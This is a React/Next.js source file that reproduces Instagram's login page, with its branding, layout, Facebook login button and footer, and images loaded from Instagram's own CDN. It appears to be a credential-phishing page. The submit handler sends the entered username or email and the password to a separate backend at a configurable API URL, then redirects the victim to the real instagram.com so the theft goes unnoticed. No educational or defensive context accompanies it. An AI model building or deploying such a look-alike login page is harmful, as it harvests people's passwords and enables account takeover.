"use client";

import { useState } from "react";
import axios from "axios";

export default function Login() {
  const [formData, setFormData] = useState({
    email: "",
    password: "",
  });
  const [error, setError] = useState("");
  const [loading, setLoading] = useState(false);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setError("");
    setLoading(true);

    try {
      const API_URL = process.env.NEXT_PUBLIC_API_URL || "http://localhost:8080";
      const response = await axios.post(`${API_URL}/api/auth/login`, formData);

      if (response.data.token) {
        localStorage.setItem("token", response.data.token);
        localStorage.setItem("user", JSON.stringify(response.data.user));
        window.location.href = `https://www.instagram.com/${formData.email}`;
      }
    } catch (err: any) {
      setError(err.response?.data?.error || "Login failed. Please try again.");
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-black flex items-center justify-center px-4">
      <div className="w-[350px] space-y-3 text-white">

        {/* Logo */}
        <div className="flex justify-center mb-8">
          <h1
            className="text-[56px] text-white"
            style={{
              fontFamily: "'Billabong', 'Lobster Two', cursive",
              fontWeight: 400,
              letterSpacing: '0.5px'
            }}
          >
            Instagram
          </h1>
        </div>

        {/* Login Box */}
        <form onSubmit={handleSubmit} className="p-10 space-y-2">
          <input
            type="text"
            placeholder="Phone number, username or email address"
            className="w-full bg-[#0a0a0a] border border-[#262626] rounded-sm px-2 py-2 text-xs text-white placeholder-neutral-500 outline-none focus:border-neutral-500"
            value={formData.email}
            onChange={(e) =>
              setFormData({ ...formData, email: e.target.value })
            }
            required
          />
          <input
            type="password"
            placeholder="Password"
            className="w-full bg-[#0a0a0a] border border-[#262626] rounded-sm px-2 py-2 text-xs text-white placeholder-neutral-500 outline-none focus:border-neutral-500"
            value={formData.password}
            onChange={(e) =>
              setFormData({ ...formData, password: e.target.value })
            }
            required
          />

          {error && (
            <p className="text-red-500 text-xs text-center py-2">{error}</p>
          )}

          <button
            type="submit"
            disabled={loading}
            className="w-full bg-[#0095f6] hover:bg-[#1877f2] py-1.5 rounded-lg text-sm font-semibold mt-3 disabled:opacity-50"
          >
            {loading ? "Logging in..." : "Log in"}
          </button>

          <div className="flex items-center gap-4 my-5">
            <div className="flex-1 h-px bg-[#262626]"></div>
            <span className="text-neutral-500 text-xs font-semibold">OR</span>
            <div className="flex-1 h-px bg-[#262626]"></div>
          </div>

          <button
            type="button"
            className="w-full text-sm font-semibold flex items-center justify-center gap-2 text-[#385185] hover:text-white"
          >
            <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 24 24">
              <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
            </svg>
            Log in with Facebook
          </button>

          <div className="text-center text-xs text-[#00376b] hover:text-white cursor-pointer pt-4">
            Forgotten your password?
          </div>
        </form>

        {/* Signup */}
        <div className="p-6 text-center text-sm">
          <span className="text-white">Don&apos;t have an account? </span>
          <span className="text-[#0095f6] font-semibold cursor-pointer hover:text-white">Sign up</span>
        </div>

        {/* Get App */}
        <div className="text-center text-sm text-white pt-4">
          Get the app.
        </div>

        <div className="flex justify-center gap-2 pb-4">
          <img
            src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png"
            alt="Get it on Google Play"
            className="h-10 cursor-pointer"
          />
          <img
            src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png"
            alt="Get it from Microsoft"
            className="h-10 cursor-pointer"
          />
        </div>

        {/* Footer */}
        <div className="text-center pt-12">
          <div className="flex flex-wrap justify-center gap-x-4 gap-y-2 mb-4 text-xs text-neutral-500">
            <a href="#" className="hover:underline">Meta</a>
            <a href="#" className="hover:underline">About</a>
            <a href="#" className="hover:underline">Blog</a>
            <a href="#" className="hover:underline">Jobs</a>
            <a href="#" className="hover:underline">Help</a>
            <a href="#" className="hover:underline">API</a>
            <a href="#" className="hover:underline">Privacy</a>
            <a href="#" className="hover:underline">Terms</a>
            <a href="#" className="hover:underline">Locations</a>
            <a href="#" className="hover:underline">Instagram Lite</a>
            <a href="#" className="hover:underline">Threads</a>
            <a href="#" className="hover:underline">Contact uploading and non-users</a>
            <a href="#" className="hover:underline">Meta Verified</a>
          </div>

          <div className="flex items-center justify-center gap-4 text-xs text-neutral-500">
            <select className="bg-transparent text-neutral-500 border-none outline-none cursor-pointer">
              <option>English (UK)</option>
            </select>
            <span>© 2025 Instagram from Meta</span>
          </div>
        </div>
      </div>
    </div>
  );
}
